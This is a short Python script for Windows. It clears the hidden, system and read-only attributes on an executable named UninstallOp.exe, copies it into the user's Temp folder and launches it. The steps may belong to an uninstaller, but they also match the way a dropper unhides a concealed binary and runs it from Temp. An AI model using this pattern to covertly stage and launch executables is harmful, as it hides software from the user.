import os
import sys
import time

newUserPath=''
with open('userPath.txt', 'rt') as f:
    userPath = f.read()
for i in range(1, len(userPath)-2):
    newUserPath+=userPath[i]
tempLocation = 'C:\\' + newUserPath + '\\AppData\\Local\\Temp'

os.system('attrib -s -h -r UninstallOp.exe')
os.system(f'copy UninstallOp.exe \"{tempLocation}\"')
os.startfile(f'{tempLocation}\\UninstallOp.exe')
